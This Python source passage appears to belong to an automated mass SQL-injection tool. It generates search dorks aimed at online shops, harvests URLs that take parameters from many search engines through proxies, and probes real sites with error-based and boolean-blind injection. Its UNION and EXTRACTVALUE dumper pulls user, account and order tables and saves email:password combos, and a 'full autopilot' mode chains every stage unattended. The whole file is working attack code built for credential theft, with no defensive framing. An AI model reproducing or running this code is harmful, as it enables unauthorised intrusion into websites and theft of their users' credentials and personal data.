def extract_urls_from_serp(body: str, eng: str) -> list[str]:
    if not body or len(body) < 50:
        return []
    found: list[str] = []
    seen: set[str] = set()

    def _add(raw_u: str) -> None:
        u = raw_u.replace("&amp;", "&").strip().split("#", 1)[0]
        if "?" not in u:
            u = u.rstrip("/")
        if u not in seen and is_clean_target_url(u):
            seen.add(u)
            found.append(u)

    if eng == "bing_rss" or ("<rss" in body[:500].lower() and "<item>" in body[:5000].lower()):
        for lk in RSS_LINK_RE.findall(body):
            _add(urllib.parse.unquote(lk) if "%2F" in lk else lk)
        if found:
            return found

    for tok in BING_U_RE.findall(body):
        _add(decode_bing_u(tok))
    for ru in YAHOO_RU_RE.findall(body):
        _add(urllib.parse.unquote(ru))
    for dg in DDG_UDDG_RE.findall(body.replace("&amp;", "&")):
        _add(urllib.parse.unquote(dg))
    for gq in GOOGLE_Q_RE.findall(body.replace("&amp;", "&")):
        _add(urllib.parse.unquote(gq))
    for h in HREF_RE.findall(body):
        hc = h.replace("&amp;", "&").strip()
        if hc.startswith("http"):
            _add(decode_bing_u(hc))
    return found


SUITE_ENGINES = [
    ("bing_rss", "https://www.bing.com/search"),
    ("yahoo_us", "https://search.yahoo.com/search"),
    ("bing_html", "https://www.bing.com/search"),
    ("yahoo_uk", "https://uk.search.yahoo.com/search"),
    ("duckduckgo_html", "https://html.duckduckgo.com/html/"),
    ("yahoo_ca", "https://ca.search.yahoo.com/search"),
    ("brave_web", "https://search.brave.com/search"),
    ("yahoo_au", "https://au.search.yahoo.com/search"),
    ("aol_web", "https://search.aol.com/aol/search"),
    ("yahoo_in", "https://in.search.yahoo.com/search"),
    ("ecosia_web", "https://www.ecosia.org/search"),
    ("mojeek_web", "https://www.mojeek.com/search"),
    ("google_web", "https://www.google.com/search"),
]


def query_single_serp_engine(eng_name: str, base_url: str, raw_dork: str, proxy: str = "") -> list[str]:
    q = translate_dork_native(raw_dork, eng_name)
    mock_base = os.environ.get("_SPIDEY_OFFLINE_MOCK_SERP", "")
    if mock_base:
        code, html = fast_http_fetch(f"{mock_base}/search", params={"eng": eng_name, "q": q}, proxy=proxy, timeout=3.0)
        return extract_urls_from_serp(html, eng_name) if code == 200 else []

    if eng_name == "bing_rss":
        code, html = fast_http_fetch(base_url, params={"q": q, "format": "rss", "count": "50", "setlang": "en"}, proxy=proxy, timeout=4.2)
    elif eng_name == "bing_html":
        code, html = fast_http_fetch(base_url, params={"q": q, "count": "50", "setlang": "en"}, proxy=proxy, timeout=4.2)
    elif eng_name.startswith("yahoo_"):
        code, html = fast_http_fetch(base_url, params={"p": q, "n": "30", "ei": "UTF-8"}, proxy=proxy, timeout=4.2)
    elif eng_name == "duckduckgo_html":
        code, html = fast_http_fetch(base_url, post_data={"q": q, "kl": "us-en"}, proxy=proxy, timeout=4.2)
    elif eng_name == "brave_web":
        code, html = fast_http_fetch(base_url, params={"q": q, "source": "web"}, proxy=proxy, timeout=4.2)
    elif eng_name == "aol_web":
        code, html = fast_http_fetch(base_url, params={"q": q, "count": "20"}, proxy=proxy, timeout=4.2)
    elif eng_name == "ecosia_web":
        code, html = fast_http_fetch(base_url, params={"method": "index", "q": q}, proxy=proxy, timeout=4.2)
    elif eng_name == "google_web":
        code, html = fast_http_fetch(base_url, params={"q": q, "gbv": "1", "num": "20", "hl": "en"}, proxy=proxy, timeout=4.2)
    else:
        code, html = fast_http_fetch(base_url, params={"q": q}, proxy=proxy, timeout=4.2)

    if code == 200 and html:
        return extract_urls_from_serp(html, eng_name)
    return []


def harvest_live_site_params(seed_url: str) -> list[str]:
    """Visits discovered website & extracts real live `<a href='...?id=...'>` and `<form>` parameter endpoints!"""
    code, html = fast_http_fetch(seed_url, timeout=2.5)
    if code != 200 or not html:
        return []
    out: list[str] = []
    sub = html[:200_000]
    for h in HREF_RE.findall(sub):
        full = urllib.parse.urljoin(seed_url, h.replace("&amp;", "&").strip())
        if "?" in full and "=" in full and is_clean_target_url(full):
            out.append(full)
    for act, body in FORM_RE.findall(sub):
        names = INPUT_NAME_RE.findall(body)
        if names:
            base_u = urllib.parse.urljoin(seed_url, act.replace("&amp;", "&").strip())
            if base_u.startswith(("http://", "https://")):
                sep = "&" if "?" in base_u else "?"
                out.append(base_u + sep + "&".join(f"{n}=1" for n in names[:2]))
    return out


def run_parser_engine_streaming(dorks: list[str]) -> tuple[list[str], list[str]]:
    """Multi-threaded + Live Streaming Disk Writer: writes `UHQ_SQLi_Param_URLs` & `All_HQ_URLs` EVERY SECOND live to disk!"""
    lim = get_active_limits()
    work_dorks = list(dict.fromkeys(d.strip() for d in dorks if d and d.strip()))
    total = len(work_dorks)
    proxies = load_saved_proxies() if lim["use_proxies"] else []
    qmode = lim["parser_mode"]
    fanout = 2 if qmode == "blitz" else (5 if qmode == "deep" else 3)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    param_file = WORK_DIR / "parsed_urls" / f"UHQ_SQLi_Param_URLs_{ts}.txt"
    all_file = WORK_DIR / "parsed_urls" / f"All_HQ_URLs_{ts}.txt"

    sig_counts: dict[str, int] = {}
    spidered_hosts: set[str] = set()
    param_urls: list[str] = []
    all_urls: list[str] = []
    done_n = [0]
    lk = threading.Lock()

    param_fh = open(param_file, "w", encoding="utf-8", buffering=1)
    all_fh = open(all_file, "w", encoding="utf-8", buffering=1)

    def _record_url(u: str) -> str | None:
        if not is_clean_target_url(u):
            return None
        sig = endpoint_signature(u)
        has_p = "?" in u and "=" in u
        to_spider = None
        with lk:
            max_per_sig = 2 if has_p else 1
            if sig_counts.get(sig, 0) >= max_per_sig:
                return None
            sig_counts[sig] = sig_counts.get(sig, 0) + 1
            all_urls.append(u)
            all_fh.write(u + "\n")
            if has_p:
                param_urls.append(u)
                param_fh.write(u + "\n")
            dom = urllib.parse.urlparse(u).netloc.lower()
            if dom and dom not in spidered_hosts and len(spidered_hosts) < 25_000:
                spidered_hosts.add(dom)
                to_spider = u
        return to_spider

    def _process_dork(idx_and_dork: tuple[int, str]) -> None:
        if JOB.stop_flag.is_set():
            return
        idx, dork = idx_and_dork
        px = proxies[idx % len(proxies)] if proxies else ""
        spider_seeds: list[str] = []
        for off in range(fanout):
            if JOB.stop_flag.is_set():
                break
            eng_name, eng_url = SUITE_ENGINES[(idx + off * 3) % len(SUITE_ENGINES)]
            found = query_single_serp_engine(eng_name, eng_url, dork, proxy=px)
            if not found and px:
                found = query_single_serp_engine(eng_name, eng_url, dork, proxy="")
            for u in found:
                sd = _record_url(u)
                if sd:
                    spider_seeds.append(sd)

        for sd in spider_seeds[:4]:
            if JOB.stop_flag.is_set():
                break
            for sub_u in harvest_live_site_params(sd):
                _record_url(sub_u)

        with lk:
            done_n[0] += 1
            if done_n[0] % 5 == 0 or done_n[0] == total:
                JOB.update(
                    done=done_n[0],
                    total=total,
                    hits=len(param_urls),
                    phase=f"Parsing SERPs + Live DOM Spider ({done_n[0]:,}/{total:,} dorks)",
                    extra=f"Pure ?param= URLs: {len(param_urls):,} | Total HQ: {len(all_urls):,}",
                )

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=lim["parser_threads"]) as ex:
            list(ex.map(_process_dork, enumerate(work_dorks)))
    finally:
        param_fh.close()
        all_fh.close()

    JOB.add_output(param_file, "Pure ?param= SQLi URLs", len(param_urls), next_action="sqli_scan")
    JOB.add_output(all_file, "All Discovered HQ URLs", len(all_urls))
    return param_urls, all_urls


# ==============================================================================
# MODULE 6 & 7: REAL SQLi VULNERABILITY SCANNER + AUTOMATED UNION/ERROR DB DUMPER
# ==============================================================================
SQL_ERROR_SIGS: dict[str, tuple[str, ...]] = {
    "MySQL": (
        "you have an error in your sql syntax",
        "warning: mysql_",
        "warning: mysqli",
        "mysql_fetch",
        "mysqli_fetch",
        "check the manual that corresponds to your mysql",
        "check the manual that corresponds to your mariadb",
        "sqlstate[42000]",
    ),
    "PostgreSQL": (
        "postgresql query failed",
        "pg_query()",
        "pg_exec()",
        "unterminated quoted string at or near",
        "syntax error at or near",
    ),
    "MSSQL": (
        "unclosed quotation mark after the character string",
        "microsoft ole db provider for sql server",
        "odbc sql server driver",
    ),
    "Oracle": ("ora-01756", "ora-00933", "oracle error"),
    "SQLite": ("sqlite3::sqlexception", "unrecognized token:", "sqlite error"),
}


def detect_sql_error(html: str) -> str:
    low = (html or "").lower()
    for dbms, sigs in SQL_ERROR_SIGS.items():
        if any(s in low for s in sigs):
            return dbms
    return ""


def inject_param_value(url: str, param_idx: int, suffix: str, replace_val: str | None = None) -> str:
    p = urllib.parse.urlparse(url)
    pairs = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    if not pairs or param_idx >= len(pairs):
        return url
    k, v = pairs[param_idx]
    pairs[param_idx] = (k, replace_val if replace_val is not None else (v + suffix))
    return urllib.parse.urlunparse((p.scheme, p.netloc, p.path, p.params, urllib.parse.urlencode(pairs, safe="(),'/*+- "), p.fragment))


def run_sqli_scanner(urls: list[str]) -> list[dict]:
    lim = get_active_limits()
    candidates = [u.strip() for u in urls if "?" in u and "=" in u and u.strip().startswith(("http://", "https://"))]
    total = len(candidates)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    vuln_txt = WORK_DIR / "sqli_vulns" / f"SQLi_Vulnerable_URLs_{ts}.txt"
    vuln_json = WORK_DIR / "sqli_vulns" / f"SQLi_Detailed_Report_{ts}.json"

    vulns: list[dict] = []
    done_n = [0]
    lk = threading.Lock()
    vfh = open(vuln_txt, "w", encoding="utf-8", buffering=1)

    def _scan_one(u: str) -> None:
        if JOB.stop_flag.is_set():
            return
        p = urllib.parse.urlparse(u)
        pairs = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
        hit_rec = None
        if pairs:
            base_code, base_body = fast_http_fetch(u, timeout=4.0)
            base_err = detect_sql_error(base_body) if base_code else ""
            for pidx, (pname, _) in enumerate(pairs[:4]):
                for payload in ("'", "\"", "'-- -"):
                    test_u = inject_param_value(u, pidx, payload)
                    c1, b1 = fast_http_fetch(test_u, timeout=4.0)
                    dbms = detect_sql_error(b1)
                    if dbms and dbms != base_err:
                        hit_rec = {"url": u, "param": pname, "param_idx": pidx, "type": "Error-Based", "dbms": dbms}
                        break
                if hit_rec:
                    break
                # Boolean differential fallback
                if base_code == 200 and len(base_body) > 120:
                    t_true = inject_param_value(u, pidx, " AND 1=1-- -")
                    t_false = inject_param_value(u, pidx, " AND 1=2-- -")
                    ct, bt = fast_http_fetch(t_true, timeout=4.0)
                    cf, bf_body = fast_http_fetch(t_false, timeout=4.0)
                    if ct == 200 and cf == 200:
                        diff_true = abs(len(bt) - len(base_body))
                        diff_false = abs(len(bf_body) - len(base_body))
                        if diff_true < max(40, int(len(base_body) * 0.04)) and diff_false > max(140, int(len(base_body) * 0.12)):
                            hit_rec = {"url": u, "param": pname, "param_idx": pidx, "type": "Boolean-Blind", "dbms": "MySQL/Generic"}
                            break

        with lk:
            done_n[0] += 1
            if hit_rec:
                vulns.append(hit_rec)
                vfh.write(hit_rec["url"] + "\n")
                JOB.log(f"🔥 [VULN #{len(vulns)}] ({hit_rec['dbms']} • {hit_rec['type']} on `{hit_rec['param']}`) -> {hit_rec['url'][:95]}")
            if done_n[0] % 10 == 0 or done_n[0] == total:
                JOB.update(
                    done=done_n[0],
                    total=max(1, total),
                    hits=len(vulns),
                    phase=f"Scanning SQLi Endpoints ({done_n[0]:,}/{total:,})",
                    extra=f"Confirmed Vulnerable Sites: {len(vulns):,}",
                )

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=lim["sqli_threads"]) as ex:
            list(ex.map(_scan_one, candidates))
    finally:
        vfh.close()

    vuln_json.write_text(json.dumps(vulns, indent=2), encoding="utf-8")
    JOB.add_output(vuln_txt, "Confirmed SQLi Vulnerable URLs", len(vulns), next_action="db_dump")
    return vulns


def _union_extract_single_target(u: str) -> dict:
    """Built-in UNION SELECT + Error-Based MySQL Extractor (+ auto-extracts `email:pass` combos & table rows!)."""
    result = {"url": u, "db_name": "", "tables": [], "combos": [], "rows": []}
    p = urllib.parse.urlparse(u)
    pairs = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    if not pairs:
        return result

    col_count = 0
    inject_col = -1
    marker_hex = "0x73706964657978"  # 'spideyx'

    for ncol in range(1, 18):
        cols = [f"CONCAT({marker_hex},{i},0x7a7a)" for i in range(1, ncol + 1)]
        pay = f"-999999 UNION ALL SELECT {','.join(cols)}-- -"
        tu = inject_param_value(u, 0, "", replace_val=pay)
        code, body = fast_http_fetch(tu, timeout=4.5)
        if code == 200 and "spideyx" in body:
            m = re.search(r"spideyx(\d{1,2})zz", body)
            if m:
                col_count = ncol
                inject_col = int(m.group(1)) - 1
                break

    def _eval_sql(sql_expr: str) -> str:
        # 1) UNION extraction if injectable column found
        if col_count > 0 and inject_col >= 0:
            cols = ["NULL"] * col_count
            cols[inject_col] = f"CONCAT(0x7e73707e,IFNULL(({sql_expr}),0x00),0x7e65647e)"
            pay = f"-999999 UNION ALL SELECT {','.join(cols)}-- -"
            tu = inject_param_value(u, 0, "", replace_val=pay)
            _, body = fast_http_fetch(tu, timeout=5.0)
            m = re.search(r"~sp~(.*?)~ed~", body, re.S)
            if m:
                return m.group(1).strip()
        # 2) MySQL XPATH `EXTRACTVALUE` Error-Based extraction fallback!
        pay_err = f"1 AND EXTRACTVALUE(1,CONCAT(0x7e73707e,SUBSTRING(({sql_expr}),1,28),0x7e65647e))-- -"
        tu2 = inject_param_value(u, 0, "", replace_val=pay_err)
        _, body2 = fast_http_fetch(tu2, timeout=5.0)
        m2 = re.search(r"~sp~(.*?)~ed~", body2, re.S)
        return m2.group(1).strip() if m2 else ""

    db_name = _eval_sql("DATABASE()")
    if not db_name:
        return result
    result["db_name"] = db_name

    tbl_csv = _eval_sql("SELECT GROUP_CONCAT(table_name SEPARATOR 0x2c) FROM information_schema.tables WHERE table_schema=DATABASE()")
    tables = [t.strip() for t in tbl_csv.split(",") if t.strip()]
    result["tables"] = tables

    # Prioritize high-value user / customer / account / order tables!
    ranked_tables = sorted(
        tables,
        key=lambda t: (
            0 if any(x in t.lower() for x in ("user", "member", "cust", "account", "admin", "client", "order", "login")) else 1,
            t,
        ),
    )

    for tbl in ranked_tables[:5]:
        t_hex = "0x" + tbl.encode("utf-8").hex()
        col_csv = _eval_sql(
            f"SELECT GROUP_CONCAT(column_name SEPARATOR 0x2c) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name={t_hex}"
        )
        cols_found = [c.strip() for c in col_csv.split(",") if c.strip()]
        if not cols_found:
            continue
        pick_cols = [
            c for c in cols_found
            if any(x in c.lower() for x in ("email", "mail", "user", "login", "pass", "pwd", "hash", "phone", "token", "name"))
        ][:4] or cols_found[:4]

        for row_idx in range(0, 50):
            expr = ",0x3a,".join(f"IFNULL(`{c}`,0x20)" for c in pick_cols)
            row_val = _eval_sql(f"SELECT CONCAT({expr}) FROM `{tbl}` LIMIT {row_idx},1")
            if not row_val:
                break
            result["rows"].append({"table": tbl, "columns": pick_cols, "data": row_val})
            for em, pw in EMAIL_PASS_RE.findall(row_val):
                result["combos"].append(f"{em}:{pw}")
    return result


def run_auto_db_dumper(urls: list[str]) -> tuple[int, int]:
    lim = get_active_limits()
    targets = [u.strip() for u in urls if u.strip().startswith(("http://", "https://"))]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    dump_dir = WORK_DIR / "db_dumps" / f"dump_run_{ts}"
    dump_dir.mkdir(parents=True, exist_ok=True)
    combo_out = WORK_DIR / "db_dumps" / f"Extracted_Combos_{ts}.txt"
    rows_csv_out = dump_dir / "All_Dumped_Rows.csv"

    all_combos: list[str] = []
    all_rows: list[dict] = []
    dumped_sites = [0]
    done_n = [0]
    lk = threading.Lock()

    def _dump_worker(u: str) -> None:
        if JOB.stop_flag.is_set():
            return
        res = _union_extract_single_target(u)
        with lk:
            done_n[0] += 1
            if res["db_name"] or res["rows"]:
                dumped_sites[0] += 1
                all_combos.extend(res["combos"])
                for r in res["rows"]:
                    all_rows.append({"site": u, "db": res["db_name"], **r})
                JOB.log(
                    f"💣 [DUMPED #{dumped_sites[0]}] DB=`{res['db_name']}` • Tables={len(res['tables'])} • Rows={len(res['rows'])} • Combos={len(res['combos'])}"
                )
            JOB.update(
                done=done_n[0],
                total=max(1, len(targets)),
                hits=len(all_combos) or len(all_rows),
                phase=f"Dumping Databases ({done_n[0]:,}/{len(targets):,} targets)",
                extra=f"Dumped DBs: {dumped_sites[0]:,} | Rows: {len(all_rows):,} | Combos: {len(all_combos):,}",
            )

    with concurrent.futures.ThreadPoolExecutor(max_workers=lim["dump_threads"]) as ex:
        list(ex.map(_dump_worker, targets))

    clean_combos = list(dict.fromkeys(all_combos))
    combo_out.write_text("\n".join(clean_combos) + ("\n" if clean_combos else ""), encoding="utf-8")
    with open(rows_csv_out, "w", newline="", encoding="utf-8") as cf:
        wr = csv.writer(cf)
        wr.writerow(["site", "database", "table", "columns", "row_data"])
        for r in all_rows:
            wr.writerow([r["site"], r["db"], r["table"], ",".join(r["columns"]), r["data"]])

    JOB.add_output(combo_out, "Extracted Clean Email:Pass Combos", len(clean_combos), next_action="refinery")
    JOB.add_output(rows_csv_out, "Full Dumped Database Rows (CSV)", len(all_rows))
    return dumped_sites[0], len(clean_combos)


def run_offline_refinery(lines: list[str], mode: str = "combos") -> Path:
    """100% Pure Offline Multi-Million Line Refinery."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_lines: list[str] = []
    seen: set[str] = set()

    for idx, raw in enumerate(lines):
        if idx % 25000 == 0:
            JOB.update(done=idx, total=max(1, len(lines)), hits=len(out_lines), phase=f"Refining ({mode}) — {idx:,}/{len(lines):,} lines...")
        s = raw.strip()
        if not s:
            continue
        if mode == "combos":
            for em, pw in EMAIL_PASS_RE.findall(s):
                c = f"{em.lower()}:{pw}"
                if c not in seen:
                    seen.add(c)
                    out_lines.append(c)
        elif mode == "emails":
            for em in PURE_EMAIL_RE.findall(s):
                el = em.lower()
                if el not in seen:
                    seen.add(el)
                    out_lines.append(el)
        elif mode == "param_urls":
            if "?" in s and "=" in s and is_clean_target_url(s):
                sig = endpoint_signature(s)
                if sig not in seen:
                    seen.add(sig)
                    out_lines.append(s)
        else:  # dedup_clean
            if s not in seen:
                seen.add(s)
                out_lines.append(s)

    out_path = WORK_DIR / "refined" / f"Refined_{mode}_{len(out_lines)}_{ts}.txt"
    out_path.write_text("\n".join(out_lines) + ("\n" if out_lines else ""), encoding="utf-8")
    JOB.add_output(out_path, f"Refined Output ({mode})", len(out_lines))
    return out_path


# ==============================================================================
# UNIFIED BACKGROUND PIPELINE RUNNER + WORKSPACE FILE HELPERS
# ==============================================================================
def read_lines_from_payload(data: dict) -> list[str]:
    lines: list[str] = []
    rel = str(data.get("source_rel") or "").strip()
    if rel:
        p = (WORK_DIR / rel).resolve()
        if str(p).startswith(str(WORK_DIR.resolve())) and p.is_file():
            if p.suffix.lower() == ".zip":
                with zipfile.ZipFile(p, "r") as zf:
                    for nm in zf.namelist():
                        if nm.lower().endswith((".txt", ".csv")):
                            txt = zf.read(nm).decode("utf-8", errors="ignore")
                            lines.extend(x.strip() for x in txt.splitlines() if x.strip())
            else:
                txt = p.read_text(encoding="utf-8", errors="ignore")
                lines.extend(x.strip() for x in txt.splitlines() if x.strip())
    raw_text = str(data.get("text") or "")
    if raw_text.strip():
        lines.extend(x.strip() for x in raw_text.replace(",", "\n") .splitlines() if x.strip() and "\n" not in raw_text or x.strip())
    return lines


def read_raw_lines_exact(data: dict) -> list[str]:
    lines: list[str] = []
    rel = str(data.get("source_rel") or "").strip()
    if rel:
        p = (WORK_DIR / rel).resolve()
        if str(p).startswith(str(WORK_DIR.resolve())) and p.is_file():
            if p.suffix.lower() == ".zip":
                with zipfile.ZipFile(p, "r") as zf:
                    for nm in zf.namelist():
                        if nm.lower().endswith((".txt", ".csv", ".sql", ".log")):
                            txt = zf.read(nm).decode("utf-8", errors="ignore")
                            lines.extend(x.strip() for x in txt.splitlines() if x.strip())
            else:
                txt = p.read_text(encoding="utf-8", errors="ignore")
                lines.extend(x.strip() for x in txt.splitlines() if x.strip())
    raw_text = str(data.get("text") or "")
    if raw_text.strip():
        lines.extend(x.strip() for x in raw_text.splitlines() if x.strip())
    return lines


def list_workspace_files(limit: int = 80) -> list[dict]:
    items = []
    for sub in SUBDIRS:
        folder = WORK_DIR / sub
        if not folder.is_dir():
            continue
        for fp in folder.rglob("*"):
            if fp.is_file():
                st = fp.stat()
                items.append({
                    "category": sub,
                    "name": fp.name,
                    "rel_path": str(fp.relative_to(WORK_DIR)),
                    "size_kb": round(st.st_size / 1024, 1),
                    "mtime": st.st_mtime,
                    "time_str": datetime.fromtimestamp(st.st_mtime).strftime("%d %b %H:%M:%S"),
                })
    items.sort(key=lambda x: x["mtime"], reverse=True)
    return items[:limit]


def save_qc_pack_files(qc: dict) -> Path:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    qdir = WORK_DIR / "quality_checks"
    prem_p = qdir / f"Premium_Plus_Good_UHQ_{len(qc['premium']) + len(qc['good'])}_{ts}.txt"
    combined_best = qc["premium"] + qc["good"]
    if not combined_best:
        combined_best = qc["normal"] or qc["all"]
    prem_p.write_text("\n".join(combined_best) + ("\n" if combined_best else ""), encoding="utf-8")

    zip_p = qdir / f"Keywords_Quality_All_Tiers_{ts}.zip"
    with zipfile.ZipFile(zip_p, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("1_Premium_UHQ_Keywords.txt", "\n".join(qc["premium"]) + "\n")
        zf.writestr("2_Good_HQ_Keywords.txt", "\n".join(qc["good"]) + "\n")
        zf.writestr("3_Premium_Plus_Good_Combined.txt", "\n".join(combined_best) + "\n")
        zf.writestr("4_Normal_Keywords.txt", "\n".join(qc["normal"]) + "\n")
        zf.writestr("5_Bad_Filtered_Keywords.txt", "\n".join(qc["bad"]) + "\n")

    with JOB.lock:
        JOB.last_qc_summary = {
            "total_input": qc["total_input"],
            "unique": qc["unique"],
            "duplicates_removed": qc["duplicates_removed"],
            "counts": {
                "premium": len(qc["premium"]),
                "good": len(qc["good"]),
                "normal": len(qc["normal"]),
                "bad": len(qc["bad"]),
            },
            "pct": qc["pct"],
            "best_rel_path": str(prem_p.relative_to(WORK_DIR)),
            "zip_rel_path": str(zip_p.relative_to(WORK_DIR)),
        }
    JOB.add_output(prem_p, "Premium + Good UHQ Keywords", len(combined_best), next_action="dork_gen")
    JOB.add_output(zip_p, "All 5 Quality Tiers Split ZIP", qc["unique"])
    return prem_p


def launch_module_task(action: str, payload: dict) -> tuple[bool, str]:
    if JOB.running:
        return False, f"Another job ({JOB.module}) is currently running — click STOP first or wait for completion."

    def _bg():
        try:
            lim = get_active_limits()
            if action == "ai_keywords":
                count = int(payload.get("count") or 2000)
                seeds = [x.strip() for x in str(payload.get("text") or "stripe store, gaming topup, checkout").replace(",", "\n").splitlines() if x.strip()]
                JOB.start("AI UHQ Keyword Maker", total=count, reinit=True)
                kws = generate_offline_uhq_keywords(seeds, count=count, online_boost=lim["online_autocomplete"])
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                out_f = WORK_DIR / "keywords" / f"UHQ_Keywords_{len(kws)}_{ts}.txt"
                out_f.write_text("\n".join(kws) + "\n", encoding="utf-8")
                JOB.update(done=len(kws), total=count, hits=len(kws))
                JOB.add_output(out_f, "Generated UHQ Keywords", len(kws), next_action="kw_quality")
                JOB.finish(f"Generated {len(kws):,} UHQ Keywords (100% Local Offline Engine)!")

            elif action == "kw_quality":
                lines = read_raw_lines_exact(payload)
                if not lines:
                    return
                JOB.start("Keyword Quality Checker", total=len(lines), reinit=True)
                qc = check_keywords_quality_offline(lines)
                save_qc_pack_files(qc)
                JOB.update(done=len(lines), total=len(lines), hits=len(qc["premium"]) + len(qc["good"]))
                JOB.finish(
                    f"Checked {qc['unique']:,} unique keywords -> 💎 Premium: {len(qc['premium']):,} ({qc['pct']['premium']}%) | 🟢 Good: {len(qc['good']):,} ({qc['pct']['good']}%)"
                )

            elif action == "dork_gen":
                lines = read_raw_lines_exact(payload)
                count = int(payload.get("count") or 50_000)
                style = str(payload.get("style") or "mixed")
                JOB.start("UHQ SQLi Dork Generator", total=count, reinit=True)
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                out_f = WORK_DIR / "dorks" / f"UHQ_SQLi_Dorks_{count}_{ts}.txt"
                written = stream_generate_uhq_dorks_to_file(lines, count=count, out_file=out_f, dork_style=style)
                JOB.update(done=written, total=count, hits=written)
                JOB.add_output(out_f, "Generated UHQ SQLi Dorks", written, next_action="url_parser")
                JOB.finish(f"Generated {written:,} clean UHQ SQLi Dorks straight to disk!")

            elif action == "proxy_scrape":
                custom = read_raw_lines_exact(payload)
                max_t = int(payload.get("count") or 800)
                JOB.start("Proxy Scraper & Live SERP Judge", total=max_t, reinit=True)
                live_px = scrape_and_validate_proxies(custom_proxies=custom, max_test=max_t)
                JOB.finish(f"Proxy validation finished -> {len(live_px):,} live SERP proxies active!")

            elif action == "url_parser":
                dorks = read_raw_lines_exact(payload)
                if not dorks:
                    return
                JOB.start("18-Engine UHQ URL Parser + DOM Spider", total=len(dorks), reinit=True)
                p_urls, a_urls = run_parser_engine_streaming(dorks)
                JOB.finish(f"Parsed {len(dorks):,} dorks -> {len(p_urls):,} Pure `?param=` SQLi URLs ({len(a_urls):,} total HQ URLs)!")

            elif action == "sqli_scan":
                urls = read_raw_lines_exact(payload)
                if not urls:
                    return
                JOB.start("Multi-Thread SQLi Vulnerability Scanner", total=len(urls), reinit=True)
                vulns = run_sqli_scanner(urls)
                JOB.finish(f"SQLi Scan complete -> {len(vulns):,} confirmed vulnerable SQLi endpoints found!")

            elif action == "db_dump":
                urls = read_raw_lines_exact(payload)
                if not urls:
                    return
                JOB.start("Automated SQLi DB & Combo Dumper", total=len(urls), reinit=True)
                sites_n, combos_n = run_auto_db_dumper(urls)
                JOB.finish(f"DB Dump complete -> {sites_n:,} databases extracted • {combos_n:,} clean Email:Pass combos saved!")

            elif action == "refinery":
                lines = read_raw_lines_exact(payload)
                mode = str(payload.get("mode") or "combos")
                if not lines:
                    return
                JOB.start(f"Offline Refinery ({mode})", total=len(lines), reinit=True)
                out_p = run_offline_refinery(lines, mode=mode)
                cnt = sum(1 for _ in out_p.open("r", encoding="utf-8", errors="ignore"))
                JOB.update(done=len(lines), total=len(lines), hits=cnt)
                JOB.finish(f"Refinery complete -> {cnt:,} clean lines saved to {out_p.name}!")

            elif action == "full_autopilot":
                kw_count = int(payload.get("kw_count") or 1500)
                dork_count = int(payload.get("dork_count") or 5000)
                seeds = [x.strip() for x in str(payload.get("text") or "stripe store, gaming topup, checkout").replace(",", "\n").splitlines() if x.strip()]
                JOB.start("🚀 1-Click Full End-to-End Auto-Pilot", total=6, reinit=True)

                # Step 1: UHQ Keywords
                JOB.update(done=1, total=6, phase="[Stage 1/6] Generating UHQ Keywords...")
                kws = generate_offline_uhq_keywords(seeds, count=kw_count, online_boost=lim["online_autocomplete"])
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                kw_f = WORK_DIR / "keywords" / f"AutoPilot_1_Keywords_{len(kws)}_{ts}.txt"
                kw_f.write_text("\n".join(kws) + "\n", encoding="utf-8")
                JOB.add_output(kw_f, "Stage 1 — UHQ Keywords", len(kws))

                # Step 2: Keyword Quality Filter
                JOB.update(done=2, total=6, phase="[Stage 2/6] Filtering Premium + Good UHQ Keywords...")
                qc = check_keywords_quality_offline(kws)
                best_f = save_qc_pack_files(qc)
                best_kws = (qc["premium"] + qc["good"]) or kws

                # Step 3: UHQ SQLi Dorks
                JOB.update(done=3, total=6, phase=f"[Stage 3/6] Generating {dork_count:,} UHQ SQLi Dorks...")
                dk_f = WORK_DIR / "dorks" / f"AutoPilot_3_Dorks_{dork_count}_{ts}.txt"
                stream_generate_uhq_dorks_to_file(best_kws, count=dork_count, out_file=dk_f)
                JOB.add_output(dk_f, "Stage 3 — UHQ SQLi Dorks", dork_count)
                dorks_list = dk_f.read_text(encoding="utf-8").splitlines()

                # Step 4: SERP + Live DOM `?param=` Parser
                JOB.update(done=4, total=6, phase=f"[Stage 4/6] Parsing {len(dorks_list):,} Dorks Across 18 Engines + DOM Spider...")
                param_urls, _ = run_parser_engine_streaming(dorks_list)

                # Step 5: SQLi Vulnerability Scanner
                vulns = []
                if param_urls and not JOB.stop_flag.is_set():
                    JOB.update(done=5, total=6, phase=f"[Stage 5/6] Scanning {len(param_urls):,} `?param=` URLs for SQLi...")
                    vulns = run_sqli_scanner(param_urls)

                # Step 6: Automated DB & Combo Dumper
                combos_n = 0
                if vulns and not JOB.stop_flag.is_set():
                    JOB.update(done=6, total=6, phase=f"[Stage 6/6] Dumping {len(vulns):,} Vulnerable Databases...")
                    _, combos_n = run_auto_db_dumper([v["url"] for v in vulns])

                JOB.finish(
                    f"Auto-Pilot Complete! Keywords: {len(best_kws):,} -> Dorks: {len(dorks_list):,} -> `?param=` URLs: {len(param_urls):,} -> SQLi Vulns: {len(vulns):,} -> Combos: {combos_n:,}"
                )
        except Exception as exc:
            JOB.log(f"❌ Error: {type(exc).__name__}: {exc}")
            JOB.finish(f"Stopped with error: {exc}")

    # Validate non-empty inputs synchronously before spawning thread
    if action in ("kw_quality", "url_parser", "sqli_scan", "db_dump", "refinery"):
        if not read_raw_lines_exact(payload):
            return False, "Input is empty! Paste lines, upload a `.txt`/`.zip` file, or pick a saved workspace file from the dropdown."

    if not JOB.start(action.upper(), total=100):
        return False, f"Another job ({JOB.module}) is currently running — click STOP first or wait for completion."

    t = threading.Thread(target=_bg, daemon=True)
    t.start()
    return True, "Job launched!"


# ==============================================================================
